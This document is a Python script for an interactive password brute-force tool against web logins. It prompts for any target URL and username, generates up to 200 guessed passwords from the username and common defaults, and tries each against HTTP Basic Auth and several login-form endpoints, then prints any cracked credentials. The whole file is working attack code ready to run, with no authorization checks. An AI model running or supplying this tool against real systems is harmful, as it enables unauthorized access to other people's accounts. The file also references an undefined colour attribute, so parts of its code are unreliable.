#!/usr/bin/env python3
"""
BLSC Brute Force - CRASH-PROOF VERSION
Fixed: Attack initialization + Timeout crashes
"""

import time
import string
import os
import sys
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib.parse import urlparse, urljoin

# Colors
class Colors:
    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
    CYAN = '\033[96m'; WHITE = '\033[97m'; BOLD = '\033[1m'
    PURPLE = '\033[95m'; RESET = '\033[0m'

def clear_screen(): os.system('cls' if os.name=='nt' else 'clear')
def print_banner(): print("""\n""" + f"""
{Colors.GREEN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║    BLSC REAL BRUTE FORCE v2.1 - CRASH-PROOF                 ║
║    Fixed: Attack initialization + Timeouts                  ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}""")

def print_status(text, status_type="info"):
    icons = {"success": "✓", "error": "✗", "warning": "!", "attack": "⚡"}
    colors = {"success": Colors.GREEN, "error": Colors.RED, "warning": Colors.YELLOW, "attack": Colors.RED}
    icon = icons.get(status_type, "*")
    color = colors.get(status_type, Colors.CYAN)
    print(f"{color}[{icon}] {text}{Colors.RESET}")

class CrashProofBLSCBruteForce:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # CRASH-PROOF HTTP ADAPTER
        retry_strategy = Retry(total=3, backoff_factor=0.1, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        self.target = None
        self.username = None
        self.found_passwords = []
        self.attack_running = False

    def safe_request(self, method, url, **kwargs):
        """CRASH-PROOF request wrapper"""
        kwargs['timeout'] = kwargs.get('timeout', 5)
        try:
            if method.upper() == 'GET':
                return self.session.get(url, **kwargs)
            elif method.upper() == 'POST':
                return self.session.post(url, **kwargs)
            elif method.upper() == 'HEAD':
                return self.session.head(url, **kwargs)
        except Exception:
            return None
        return None

    def validate_target(self, target):
        """Safe target validation"""
        print_status("🔍 Validating target...", "attack")
        parsed = urlparse(target)
        if not parsed.scheme:
            target = "http://" + target
            
        # Test HEAD first (fast)
        response = self.safe_request('HEAD', target)
        if response and response.status_code in [200, 301, 302]:
            self.target = target.rstrip('/')
            print_status(f"✅ TARGET LIVE: {self.target}", "success")
            return True
            
        # Fallback to GET
        response = self.safe_request('GET', target)
        if response:
            self.target = target.rstrip('/')
            print_status(f"✅ TARGET LIVE: {self.target} (Status: {response.status_code})", "success")
            return True
            
        print_status("❌ TARGET DOWN", "error")
        return False

    def validate_username(self, username):
        """Safe username validation"""
        print_status(f"🔍 Checking '{username}'...", "attack")
        self.username = username
        
        # Quick username endpoints
        test_urls = [
            f"{self.target}/{username}",
            f"{self.target}/user/{username}",
            f"{self.target}/profile/{username}",
            f"{self.target}/u/{username}"
        ]
        
        for url in test_urls:
            resp = self.safe_request('GET', url)
            if resp and resp.status_code == 200:
                if username.lower() in resp.text.lower():
                    print_status(f"✅ USERNAME CONFIRMED: {username}", "success")
                    return True
        
        # Assume valid if target responds
        print_status(f"⚠️  USERNAME ASSUMED: {username}", "warning")
        return True

    def generate_smart_passwords(self):
        """Generate crash-proof password list"""
        base_passwords = [
            self.username,
            self.username + "123",
            self.username + "2024",
            self.username + "!",
            "password", "123456", "admin", 
            self.username.capitalize()
        ]
        
        passwords = base_passwords.copy()
        charset = "abcdefghijklmnopqrstuvwxyz0123456789!@#"
        
        for base in base_passwords[:3]:  # Limit mutations
            for i in range(min(3, len(base))):
                for c in charset[:10]:  # Limited charset
                    mutated = base[:i] + c + base[i+1:]
                    passwords.append(mutated)
        
        return passwords[:200]  # Max 200 passwords

    def test_single_credential(self, password):
        """Safe single credential test"""
        if not self.target or not self.username:
            return False
            
        # 1. Basic Auth
        resp = self.safe_request('GET', self.target, auth=(self.username, password), allow_redirects=False)
        if resp and resp.status_code == 200:
            return True
        
        # 2. Common form logins
        login_urls = [self.target, f"{self.target}/login", f"{self.target}/auth"]
        form_payloads = [
            {'username': self.username, 'password': password},
            {'user': self.username, 'pass': password}, 
            {'email': self.username, 'pwd': password}
        ]
        
        for url in login_urls:
            for payload in form_payloads:
                resp = self.safe_request('POST', url, data=payload, allow_redirects=False)
                if resp:
                    if resp.status_code == 200:
                        success_indicators = ['welcome', 'dashboard', 'success', 'profile']
                        if any(indicator in resp.text.lower() for indicator in success_indicators):
                            return True
                    elif resp.status_code in [302, 301]:
                        return True
        
        return False

    def launch_stable_attack(self):
        """CRASH-PROOF attack loop"""
        self.attack_running = True
        passwords = self.generate_smart_passwords()
        
        print(f"\n{Colors.PURPLE}{'='*60}")
        print_status(f"🚀 LAUNCHING {len(passwords):,} ATTACKS", "attack")
        print(f"{Colors.PURPLE}{'='*60}\n")
        
        start_time = time.time()
        tested = 0
        
        for password in passwords:
            if not self.attack_running:
                break
                
            tested += 1
            elapsed = time.time() - start_time
            
            # SMOOTH PROGRESS BAR
            progress = min((tested / len(passwords)) * 100, 100)
            bar_len = 30
            filled = int(bar_len * progress // 100)
            bar = f"{Colors.GREEN}█{Colors.RESET}" * filled + f"{Colors.GREY}░{Colors.RESET}" * (bar_len - filled)
            
            pwd_show = password[:10] + "..." if len(password) > 10 else password
            
            sys.stdout.write(f"\r{bar} {progress:5.1f}% | "
                           f"{Colors.WHITE}{tested}/{len(passwords)}{Colors.RESET} | "
                           f"{Colors.YELLOW}{pwd_show}{Colors.RESET} | "
                           f"{Colors.CYAN}{elapsed:.1f}s")
            sys.stdout.flush()
            
            # REAL ATTACK
            if self.test_single_credential(password):
                total_time = time.time() - start_time
                print(f"\n\n{Colors.GREEN}{'='*60}")
                print(f"   🎉 CRACKED! {total_time:.2f}s   ")
                print(f"{Colors.GREEN}{'='*60}")
                print_status(f"✅ {self.username}:{password}", "success")
                self.found_passwords.append(password)
                break
            
            time.sleep(0.05)  # Stable attack speed
        
        print("\n")  # Clean line break

def main():
    clear_screen()
    print_banner()
    
    bruteforcer = CrashProofBLSCBruteForce()
    
    # STEP 1: TARGET
    while True:
        target = input(f"{Colors.GREEN}📡 TARGET: {Colors.WHITE}").strip()
        if bruteforcer.validate_target(target):
            break
    
    # STEP 2: USERNAME  
    username = input(f"{Colors.GREEN}👤 USERNAME: {Colors.WHITE}").strip()
    bruteforcer.validate_username(username)
    
    # STEP 3: ATTACK CONFIRM
    print(f"\n{Colors.RED}{'='*50}")
    print(f"🎯 {bruteforcer.target}")
    print(f"👤  {bruteforcer.username}")
    print(f"{Colors.RED}{'='*50}")
    
    input(f"\n{Colors.YELLOW}⏰ ENTER = ATTACK > {Colors.RESET}")
    
    try:
        bruteforcer.launch_stable_attack()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⛔ STOPPED{Colors.RESET}")
    
    # REPORT
    print(f"\n{Colors.GREEN}{'='*50}")
    print("📊 PENTEST REPORT")
    print(f"{Colors.GREEN}{'='*50}")
    
    if bruteforcer.found_passwords:
        for pwd in bruteforcer.found_passwords:
            print(f"🔑 {Colors.BOLD}{bruteforcer.username}:{pwd}{Colors.RESET}")
    else:
        print_status("No passwords found", "warning")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye{Colors.RESET}")